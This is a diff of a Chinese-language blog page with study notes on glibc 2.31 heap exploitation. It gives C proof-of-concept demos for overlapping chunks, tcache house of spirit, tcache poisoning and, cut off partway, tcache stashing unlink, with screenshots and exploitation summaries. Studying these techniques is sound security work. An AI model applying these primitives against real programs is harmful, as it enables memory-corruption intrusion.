+        <span class="token function">memset</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token char">'1'</span><span class="token punctuation">,</span> <span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">memset</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span> <span class="token char">'2'</span><span class="token punctuation">,</span> <span class="token number">0x500</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span> <span class="token char">'3'</span><span class="token punctuation">,</span> <span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> evil_chunk_size <span class="token operator">=</span> <span class="token number">0x581</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> evil_region_size <span class="token operator">=</span> <span class="token number">0x580</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span><span class="token punctuation">,</span>
+                 evil_chunk_size<span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/* VULNERABILITY */</span>
+        <span class="token operator">*</span><span class="token punctuation">(</span>p2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> evil_chunk_size<span class="token punctuation">;</span> <span class="token comment">// we are overwriting the "size" field of chunk p2</span>
+        <span class="token comment">/* VULNERABILITY */</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNow let's free the chunk p2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNow let's allocate another chunk with a size equal to the data\n"</span>
+               <span class="token string">"size of the chunk p2 injected size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This malloc will be served from the previously freed chunk that\n"</span>
+               <span class="token string">"is parked in the unsorted bin which size has been modified by us\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\np4 has been allocated at %p and ends at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token operator">+</span>evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p3 starts at %p and ends at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token operator">+</span><span class="token number">0x580</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span>
+                   <span class="token string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's run through an example. Right now, we have:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIf we memset(p4, '4', %d), we have:\n"</span><span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">memset</span><span class="token punctuation">(</span>p4<span class="token punctuation">,</span> <span class="token char">'4'</span><span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span> <span class="token char">'3'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<p>申请3个chunk：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319132608161.png" style="zoom:50%;" />
+
+<p>对3个chunk进行初始化（填充）：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319132954332.png"></p>
+<p>定义变量两个变量：</p>
+<p>evil_chunk_size&#x3D;&#x3D;》模拟堆块的size&#x3D;&#x3D;》chunk2+chunk3</p>
+<p>evil_region_size&#x3D;&#x3D;》模拟堆块中data区的size</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319133907153.png"></p>
+<p>将chunk2得size修改为evil_chunk_size&#x3D;&#x3D;》0x581</p>
+<p>&#x3D;&#x3D;》模拟在chunk1进行溢出，且chunk1要有chunk2的prev_size控制权&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319140102814.png"></p>
+<p>此时chunk2和chunk3合并&#x3D;&#x3D;》</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319140334021.png" style="zoom:67%;" />
+
+
+
+<p>释放合并后的chunk&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319140456717.png"></p>
+<p>与top chunk相邻&#x3D;&#x3D;》被top chunk吞并</p>
+<p>申请一个0x578大小的chunk&#x3D;&#x3D;》bin中没有可以分配的堆块&#x3D;&#x3D;》直接从top_chunk中进行分割&#x3D;&#x3D;》</p>
+<p>将0x578大小的chunk的malloc指针赋给p4&#x3D;&#x3D;》</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319155112129.png" style="zoom:50%;" />
+
+<p>初始化chunk4：</p>
+<p>未初始化前：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319155621283.png"></p>
+<p>初始化后（填充4）：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319155524779.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319160305977.png"></p>
+<p>&#x3D;&#x3D;&#x3D;》chunk 3被包含进chunk 4&#x3D;&#x3D;》chunk3是作为chunk4的数据部分使用&#x3D;&#x3D;》</p>
+<p>对chunk3进行初始化（填充3）：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319161114844.png"></p>
+<p>chunk3虽然被包含进chunk4中，但是chunk3的malloc指针并没有受到影响&#x3D;&#x3D;》堆块本身的读写没有受到影响</p>
+<h2 id="总结：-2"><a href="#总结：-2" class="headerlink" title="总结："></a>总结：</h2><p>利用前提：</p>
+<p>1、程序中有对堆块的增，删，改的操作</p>
+<p>2、堆块中存在溢出（溢出到下一个堆块的size）</p>
+<p>适用场景：</p>
+<p>1、只能溢出到size的8个字节</p>
+<p>2、首先对溢出后的合并的chunk进行部署：</p>
+<p>将hook地址部署至高地址堆块的data起始位置</p>
+<p>第二次修改高地址位内容为one_gadget</p>
+<p>3、创建一个能隔离top_chunk的堆块达到UAF</p>
+<h2 id="tcahe-house-of-spirit-2-31"><a href="#tcahe-house-of-spirit-2-31" class="headerlink" title="tcahe_house_of_spirit 2.31"></a>tcahe_house_of_spirit 2.31</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This file demonstrates the house of spirit attack on tcache.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Ok. Let's start with the example!.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Calling malloc() once so that it sets up its memory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span> <span class="token comment">//pointer that will be overwritten</span>
+        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//fake chunk region</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This region contains one fake chunk. It's size field is placed at %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free     for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 w    ill all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// this is the size</span>
+
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the overwritten pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">void</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>b <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<p>申请一个chunk：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319164424519.png" style="zoom:67%;" />
+
+<p>创建一个long long类型的指针a和数组fake_chunk[10]</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319164827880.png"></p>
+<p>将fake_chunks[1]覆盖成0x40</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319170430417.png"></p>
+<p>将fake_chunks[2]的地址赋给a：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319170513716.png"></p>
+<p>释放fake_chunk_a:</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319170638493.png" style="zoom:67%;" />
+
+<p>申请一个0x30的chunk&#x3D;&#x3D;》在tcache bin中恰好有符合要求的fake_chunk_a:</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319170832278.png"></p>
+<p>fake_chunk被当作一个正常堆块重新启用</p>
+<p>&#x3D;&#x3D;&#x3D;》如果拥有对堆块写操作的话可以实现在数据段进行环境部署</p>
+<h2 id="总结：-3"><a href="#总结：-3" class="headerlink" title="总结："></a>总结：</h2><p>可以对数据段或者bss段进行伪造堆块的部署&#x3D;&#x3D;》或者事先在数据段部署hook地址&#x3D;&#x3D;》挂钩子</p>
+<h2 id="tcache-poisoning-2-31"><a href="#tcache-poisoning-2-31" class="headerlink" title="tcache_poisoning 2.31"></a>tcache_poisoning 2.31</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span> </span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token comment">// disable buffering</span>
+        <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"</span>
+                  <span class="token string">"returning a pointer to an arbitrary location (in this case, the stack).\n"</span>
+                  <span class="token string">"The attack is very similar to fastbin corruption attack.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"</span>
+                  <span class="token string">"We have to create and free one more chunk for padding before fd pointer hijacking.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+        <span class="token class-name">size_t</span> stack_var<span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The address we want malloc() to return is %p.\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocating 2 buffers.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">intptr_t</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(128): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">intptr_t</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(128): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the buffers...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now the tcache list has [ %p -> %p ].\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"</span>
+                   <span class="token string">"to point to the location to control (%p).\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now the tcache list has [ %p -> %p ].\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1st malloc(128): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now the tcache list has [ %p ].\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">intptr_t</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2nd malloc(128): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We got the control\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<p>创建变量stack_var和申请两个堆块0x90：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319193322407.png" style="zoom:67%;" />
+
+
+
+<p>释放chunk_a和chunk_b&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319193620215.png"></p>
+<p>将chunk b的fd指针位置改为stack_var地址：</p>
+<p>为修改前：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319195214913.png" style="zoom:67%;" />
+
+<p> 修改后：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319195906702.png" style="zoom:67%;" />
+
+<p>bin:</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319195921311.png" style="zoom:67%;" />
+
+<p>申请一个0x90的chunk，将chunk b申请出来：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319200018532.png"></p>
+<p>最后申请一个0x90的chunk c&#x3D;&#x3D;》stack_var被当作一个堆块启用：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319200125725.png"></p>
+<h2 id="总结：-4"><a href="#总结：-4" class="headerlink" title="总结："></a>总结：</h2><p>利用chunk被释放，但是指针未被清空&#x3D;&#x3D;》修改已释放堆块的fd指针至目标地址&#x3D;&#x3D;》获得目标地址的控制权</p>
+<h2 id="tcache-stashing-unlink-attack-2-31"><a href="#tcache-stashing-unlink-attack-2-31" class="headerlink" title="tcache_stashing_unlink_attack 2.31"></a>tcache_stashing_unlink_attack 2.31</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+ 
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>chunk_lis<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+     <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>target<span class="token punctuation">;</span>
+ 
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This file demonstrates the stashing unlink attack on tcache.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last no    t least, we need a writable address to bypass check in glibc\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.    \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+     <span class="token comment">// stack_var emulate the fake_chunk we want to alloc to</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stack_var emulates the fake chunk we want to alloc to.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we     can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
